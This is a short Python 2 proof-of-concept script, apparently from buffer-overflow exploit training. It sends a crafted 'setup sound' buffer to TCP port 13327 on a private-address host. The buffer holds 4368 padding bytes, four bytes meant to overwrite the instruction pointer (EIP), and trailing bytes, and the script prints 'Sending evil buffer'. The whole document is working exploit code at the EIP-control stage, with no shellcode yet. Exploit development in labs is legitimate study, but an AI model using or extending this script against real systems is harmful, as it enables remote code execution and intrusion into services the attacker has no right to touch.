#!/usr/bin/python
import socket

host = "192.168.214.44"

# Adjust the padding to incorporate the bad chars
padding = "\x41" * 4368
eip = "B" * 4
buffer = "\x11(setup sound " + padding + eip + "\x20\x20\x20\x20\x20\x20\x20" + "\x90\x00#"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "[*]Sending evil buffer..."

s.connect((host, 13327))
print s.recv(1024)

s.send(buffer)
s.close()

print "[*]Payload Sent !"
